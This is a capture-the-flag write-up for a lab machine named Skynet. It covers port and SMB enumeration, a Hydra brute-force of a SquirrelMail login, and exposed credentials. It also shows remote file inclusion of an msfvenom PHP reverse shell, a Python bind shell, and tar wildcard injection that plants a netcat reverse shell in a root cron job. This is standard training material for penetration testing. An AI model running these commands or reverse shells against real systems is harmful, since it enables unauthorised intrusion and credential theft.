# Table of Contents
* [Enumerate](#enumerate)
* [Exploit](#exploit)
* [Escalate](#escalate)

# Enumerate
## Ports and Service Versions
Used Nmap to discover TCP ports 
```bash
nmap 10.10.31.32 -sV

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 16:25 MDT
Nmap scan report for 10.10.31.32
Host is up (0.21s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.93 seconds
```

```bash
nmap 10.10.31.32 -sC

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 19:15 MDT
Nmap scan report for 10.10.31.32
Host is up (0.21s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http
|_http-title: Skynet
110/tcp open  pop3
|_pop3-capabilities: RESP-CODES SASL PIPELINING AUTH-RESP-CODE UIDL CAPA TOP
139/tcp open  netbios-ssn
143/tcp open  imap
|_imap-capabilities: more have ENABLE post-login LOGINDISABLEDA0001 Pre-login SASL-IR ID IDLE LITERAL+ IMAP4rev1 listed LOGIN-REFERRALS capabilities OK
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-04-10T20:15:26-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-11T01:15:26
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 59.79 seconds
```

## Web Browsing
Used Firefox to browse TCP port 80 on the target IP addressed. Also attempted to browse the directories listed in the next section. 
```bash
firefox 10.10.31.32 # search bar
```

Installed the "Foxy Proxy" browser add-on (makes it easier to use or not use Burp while Burp is running). 

## Web Crawling
Downloaded and used dirsearch to crawl TCP port 80.
```bash
git clone https://github.com/maurosoria/dirsearch
cd dirsearch 
python3 dirsearch.py -u 10.10.31.32

# output
[16:29:06] 301 -  307B  - /js  ->  http://10.10.31.32/js/ # You don't have permission to access this resource.
[16:29:31] 301 -  310B  - /admin  ->  http://10.10.31.32/admin/ # You don't have permission to access this resource.
[16:29:49] 301 -  311B  - /config  ->  http://10.10.31.32/config/ # You don't have permission to access this resource.          
[16:29:51] 301 -  308B  - /css  ->  http://10.10.31.32/css/ # You don't have permission to access this resource.
[16:30:00] 200 -  523B  - /index.html # search bar           
[16:30:21] 301 -  317B  - /squirrelmail  ->  http://10.10.31.32/squirrelmail/ # login page
```

## SMB Enumeration
```bash
nmap 10.10.31.32 -p139,445 --script smb-enum-shares

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 17:06 MDT
Nmap scan report for 10.10.31.32
Host is up (0.21s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.31.32\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.31.32\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.31.32\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.31.32\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 39.86 seconds
```

### smbclient
IPC$ share (anonymous access: READ/WRITE).
```
smbclient //10.10.31.32/ipc$
dir
```

Anonymous share (anonymous access: READ/WRITE).
```
smbclient //10.10.31.32/anonymous
dir   

# output
  .                                   D        0  Thu Nov 26 09:04:00 2020
  ..                                  D        0  Tue Sep 17 01:20:17 2019
  attention.txt                       N      163  Tue Sep 17 21:04:59 2019
  logs                                D        0  Tue Sep 17 22:42:16 2019
```

### smbget
```
smbget -R smb://10.10.31.32/anonymous

# output
Password for [victor] connecting to //anonymous/10.10.31.32: 
Using workgroup WORKGROUP, user victor
smb://10.10.31.32/anonymous/attention.txt                                                                                                                                                     
smb://10.10.31.32/anonymous/logs/log2.txt                                                                                                                                                     
smb://10.10.31.32/anonymous/logs/log1.txt                                                                                                                                                     
smb://10.10.31.32/anonymous/logs/log3.txt                                                                                                                                                     
Downloaded 634b in 9 seconds
```

```bash
cat attention.txt 

# output
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

```bash
cat logs/log1.txt

# output
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```


### smbmap
```bash
smbmap -H 10.10.31.32

# output
[+] Guest session       IP: 10.10.31.32:445     Name: 10.10.31.32                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

## Vulnerability Discovery
```bash
nmap 10.10.31.32 -p139,445 --script smb-vuln*

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 17:31 MDT
Nmap scan report for 10.10.31.32
Host is up (0.22s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

Nmap done: 1 IP address (1 host up) scanned in 55.56 seconds
```

# Exploit
## Password Guessing
Used Burp, Hydra, and the HTML login form found under `/squirrelmail`.

### Burp
* Turned-on Burp Proxy.
* Turned-on Foxy Proxy and seleted the custom "Burp" profile (127.0.0.1:8080).
* Attempted to login with the username "miles" and "password" and intercepted the request with Burp. 
```bash
# URI (where the POST request will be sent to)
/squirrelmail/src/redirect.php # discovered in Burp

# Variables
login_username=miles&secretkey=password&js_autodetect_results=1&just_logged_in=1

# Error Message Once Forwarded
Unknown user or password incorrect.
```

### Hydra
```bash
hydra -l milesdyson -P logs/log1.txt 10.10.31.32 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"

# output
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-10 19:30:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.31.32:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect
[80][http-post-form] host: 10.10.31.32   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-10 19:30:27
```

## Email Browsing
After authenticating to Miles's (username: milesdyson; password: see above) Squirrelmail (IMAP) inbox, I also identitifed his new SMB password. 
```bash
FROM: skynet@skynet

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

### smbget
```
smbget -R smb://10.10.31.32/milesdyson -U milesdyson

# output 
Password for [milesdyson] connecting to //milesdyson/10.10.31.32: 
Using workgroup WORKGROUP, user milesdyson
smb://10.10.31.32/milesdyson/Improving Deep Neural Networks.pdf                                                                                                                               
smb://10.10.31.32/milesdyson/Natural Language Processing-Building Sequence Models.pdf                                                                                                         
smb://10.10.31.32/milesdyson/Convolutional Neural Networks-CNN.pdf                                                                                                                            
smb://10.10.31.32/milesdyson/notes/3.01 Search.md                                                                                                                                             
smb://10.10.31.32/milesdyson/notes/4.01 Agent-Based Models.md                                                                                                                                 
smb://10.10.31.32/milesdyson/notes/2.08 In Practice.md                                                                                                                                        
smb://10.10.31.32/milesdyson/notes/0.00 Cover.md                                                                                                                                              
smb://10.10.31.32/milesdyson/notes/1.02 Linear Algebra.md                                                                                                                                     
smb://10.10.31.32/milesdyson/notes/important.txt                                                                                                                                              
smb://10.10.31.32/milesdyson/notes/6.01 pandas.md                                                                                                                                             
smb://10.10.31.32/milesdyson/notes/3.00 Artificial Intelligence.md                                                                                                                            
smb://10.10.31.32/milesdyson/notes/2.01 Overview.md                                                                                                                                           
smb://10.10.31.32/milesdyson/notes/3.02 Planning.md                                                                                                                                           
smb://10.10.31.32/milesdyson/notes/1.04 Probability.md                                                                                                                                        
smb://10.10.31.32/milesdyson/notes/2.06 Natural Language Processing.md                                                                                                                        
smb://10.10.31.32/milesdyson/notes/2.00 Machine Learning.md                                                                                                                                   
smb://10.10.31.32/milesdyson/notes/1.03 Calculus.md                                                                                                                                           
smb://10.10.31.32/milesdyson/notes/3.03 Reinforcement Learning.md                                                                                                                             
smb://10.10.31.32/milesdyson/notes/1.08 Probabilistic Graphical Models.md                                                                                                                     
smb://10.10.31.32/milesdyson/notes/1.06 Bayesian Statistics.md                                                                                                                                
smb://10.10.31.32/milesdyson/notes/6.00 Appendices.md                                                                                                                                         
smb://10.10.31.32/milesdyson/notes/1.01 Functions.md                                                                                                                                          
smb://10.10.31.32/milesdyson/notes/2.03 Neural Nets.md                                                                                                                                        
smb://10.10.31.32/milesdyson/notes/2.04 Model Selection.md                                                                                                                                    
smb://10.10.31.32/milesdyson/notes/2.02 Supervised Learning.md                                                                                                                                
smb://10.10.31.32/milesdyson/notes/4.00 Simulation.md                                                                                                                                         
smb://10.10.31.32/milesdyson/notes/3.05 In Practice.md                                                                                                                                        
smb://10.10.31.32/milesdyson/notes/1.07 Graphs.md                                                                                                                                             
smb://10.10.31.32/milesdyson/notes/2.07 Unsupervised Learning.md                                                                                                                              
smb://10.10.31.32/milesdyson/notes/2.05 Bayesian Learning.md                                                                                                                                  
smb://10.10.31.32/milesdyson/notes/5.03 Anonymization.md                                                                                                                                      
smb://10.10.31.32/milesdyson/notes/5.01 Process.md                                                                                                                                            
smb://10.10.31.32/milesdyson/notes/1.09 Optimization.md                                                                                                                                       
smb://10.10.31.32/milesdyson/notes/1.05 Statistics.md                                                                                                                                         
smb://10.10.31.32/milesdyson/notes/5.02 Visualization.md                                                                                                                                      
smb://10.10.31.32/milesdyson/notes/5.00 In Practice.md                                                                                                                                        
smb://10.10.31.32/milesdyson/notes/4.02 Nonlinear Dynamics.md                                                                                                                                 
smb://10.10.31.32/milesdyson/notes/1.10 Algorithms.md                                                                                                                                         
smb://10.10.31.32/milesdyson/notes/3.04 Filtering.md                                                                                                                                          
smb://10.10.31.32/milesdyson/notes/1.00 Foundations.md                                                                                                                                        
smb://10.10.31.32/milesdyson/Neural Networks and Deep Learning.pdf                                                                                                                            
smb://10.10.31.32/milesdyson/Structuring your Machine Learning Project.pdf                                                                                                                    
Downloaded 45.07MB in 252 seconds
```

```bash
cat notes/important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

## Web Browsing
Browsed to the beta CMS. 
```bash
firefox http://10.10.31.32/45kra24zxs28v3yd/

# output
Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,
a computer A.I. intended to control electronically linked weapons and defend the United States.
```

## Web Crawling
```bash
python3 dirsearch/dirsearch.py -u 10.10.31.32/45kra24zxs28v3yd

# output
[20:40:45] 301 -  335B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.31.32/45kra24zxs28v3yd/administrator/
[20:40:45] 200 -    5KB - /45kra24zxs28v3yd/administrator/
[20:40:46] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
[20:41:06] 200 -  418B  - /45kra24zxs28v3yd/index.html  
```

## Remote File Inclusion
```bash
while true; do nc -nvlp 5050; done
msfvenom -p php/reverse_php LHOST=10.2.76.52 LPORT=5050 -f raw -o shell.php
python3 -m http.server 8080
```

```bash
http://10.10.31.32/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.76.52:8080/shell.php
```

# Escalate
www-data to milesdyson
```bash
su milesdyson # su : must be run from a terminal

# opened a port as www-data
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# connected to it
nc 10.10.202.211 4444

# upgraded to a terminal shell
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python asdf.py

# successfully switched user accounts
su milesdyson

wget -O linenum.sh http://10.2.76.52:8080/linenum.sh
chmod +x linenum.sh
./linenum.sh > skynet_enumerated.txt
python3 -m http.server 8080

# on the attacker side
firefox http://10.10.31.32:8080/sky_enumerated.txt # found a crontab
```

Crontab
```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

www-data to root
```bash
# on the attacker side
msfvenom -p cmd/unix/reverse_netcat lhost=10.2.76.52 lport=6969 R

# output
mkfifo /tmp/jvosh; nc 10.2.76.52 6969 0</tmp/jvosh | /bin/sh >/tmp/jvosh 2>&1; rm /tmp/jvosh
```
```bash
nc -nvlp 6969
```

```bash
# on the victim side
echo "mkfifo /tmp/jvosh; nc 10.2.76.52 6969 0</tmp/jvosh | /bin/sh >/tmp/jvosh 2>&1; rm /tmp/jvosh" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
